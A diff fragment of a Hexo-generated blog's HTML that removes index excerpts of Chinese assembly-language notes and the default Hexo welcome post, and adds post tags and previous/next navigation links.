 <p>var x = “Hello <br> World!”;</p>
 
-      
     </div>
 
     
@@ -472,368 +356,29 @@
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"> <i class="fa fa-tag"></i> web</a>
+              <a href="/tags/JavaScript/" rel="tag"> <i class="fa fa-tag"></i> JavaScript</a>
+          </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://e1iauks.github.io/2022/01/29/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%B8%89%E3%80%81%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="E1iauk_S">
-      <meta itemprop="description" content="卷死他们捏！">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="E1iaukのblog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/29/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%B8%89%E3%80%81%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/" class="post-title-link" itemprop="url">三、第一个程序</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-01-29 17:48:59" itemprop="dateCreated datePublished" datetime="2022-01-29T17:48:59+08:00">2022-01-29</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-01-31 19:23:42" itemprop="dateModified" datetime="2022-01-31T19:23:42+08:00">2022-01-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%B1%87%E7%BC%96%EF%BC%9A%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%BC%82%E4%B8%96%E7%95%8C/" itemprop="url" rel="index"><span itemprop="name">汇编：从零开始的异世界</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="三、第一个程序"><a href="#三、第一个程序" class="headerlink" title="三、第一个程序"></a>三、第一个程序</h1><h2 id="1、汇编程序从写出到执行的过程"><a href="#1、汇编程序从写出到执行的过程" class="headerlink" title="1、汇编程序从写出到执行的过程"></a>1、汇编程序从写出到执行的过程</h2><p><img src="/2022/01/29/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%B8%89%E3%80%81%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/a2db833ac47cd8ae1016830bfcaf2a2c.png" alt="截图"></p>
-<p><img src="/2022/01/29/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%B8%89%E3%80%81%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/b763ebbbc7575f4af6ae3dacdaaa52da.png" alt="截图"></p>
-<p>加载后，CPU的CS:IP指向程序的第一条指令（即程序的入口）</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/01/29/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%B8%89%E3%80%81%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://e1iauks.github.io/2022/01/27/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="E1iauk_S">
-      <meta itemprop="description" content="卷死他们捏！">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="E1iaukのblog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/27/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8/" class="post-title-link" itemprop="url">二、寄存器</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-01-27 23:48:57" itemprop="dateCreated datePublished" datetime="2022-01-27T23:48:57+08:00">2022-01-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-01-31 16:08:26" itemprop="dateModified" datetime="2022-01-31T16:08:26+08:00">2022-01-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%B1%87%E7%BC%96%EF%BC%9A%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%BC%82%E4%B8%96%E7%95%8C/" itemprop="url" rel="index"><span itemprop="name">汇编：从零开始的异世界</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="二、寄存器"><a href="#二、寄存器" class="headerlink" title="二、寄存器"></a>二、寄存器</h1><h2 id="1、基础知识"><a href="#1、基础知识" class="headerlink" title="1、基础知识"></a>1、基础知识</h2><p>16位结构CPU具有下面几方面的结构特性。</p>
-<ul>
-<li>运算器一次最多可以处理16位的数据；</li>
-<li>寄存器的最大宽度为16位；</li>
-<li>寄存器和运算器之间的通路为16位。</li>
-</ul>
-<p>8086CPU可以一次性处理以下两种尺寸的数据</p>
-<p>字节：记为byte，一个字节由8个bit组成，可以存在8位寄存器中。</p>
-<p>字：记为word，一个字由两个字节组成，可以存在一个16位寄存器中(16位CPU)</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/01/27/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/29/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%B8%89%E3%80%81%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/" rel="prev" title="三、第一个程序">
+                  <i class="fa fa-chevron-left"></i> 三、第一个程序
+                </a>
             </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://e1iauks.github.io/2022/01/27/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="E1iauk_S">
-      <meta itemprop="description" content="卷死他们捏！">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="E1iaukのblog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/27/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">一、基础知识</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-01-27 23:12:57" itemprop="dateCreated datePublished" datetime="2022-01-27T23:12:57+08:00">2022-01-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-01-31 16:09:20" itemprop="dateModified" datetime="2022-01-31T16:09:20+08:00">2022-01-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%B1%87%E7%BC%96%EF%BC%9A%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%BC%82%E4%B8%96%E7%95%8C/" itemprop="url" rel="index"><span itemprop="name">汇编：从零开始的异世界</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1、指令"><a href="#1、指令" class="headerlink" title="1、指令"></a>1、指令</h2><p>机器指令：CPU能直接识别并执行的二进制编码</p>
-<p>汇编指令：汇编指令是机器指令的助记符，同机器指令一一对应。</p>
-<p>指令：指令通常由操作码和地址码（操作数）两部分组成</p>
-<p>指令集：每种CPU都有自己的汇编指令集。</p>
-<p>汇编指令由3类指令组成。</p>
-<ul>
-<li>伪指令：没有对应的机器码，由编译器执行，计算机并不执行</li>
-<li>其他符号：如+、-、*、/等，由编译器识别，没有对应的机器码。</li>
-<li>编译器：够将汇编指令转换成机器指令的翻译程序每一种CPU都有自己的汇编指令集。</li>
-</ul>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/01/27/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
+            <div class="post-nav-item">
+                <a href="/2022/02/05/ctfshow%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" rel="next" title="ctfshow知识点总结">
+                  ctfshow知识点总结 <i class="fa fa-chevron-right"></i>
+                </a>
             </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+          </div>
     </footer>
   </article>
 </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://e1iauks.github.io/2022/01/26/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="E1iauk_S">
-      <meta itemprop="description" content="卷死他们捏！">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="E1iaukのblog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/01/26/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-01-26 08:11:35 / 修改时间：14:46:50" itemprop="dateCreated datePublished" datetime="2022-01-26T08:11:35+08:00">2022-01-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h2><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
 
 
 
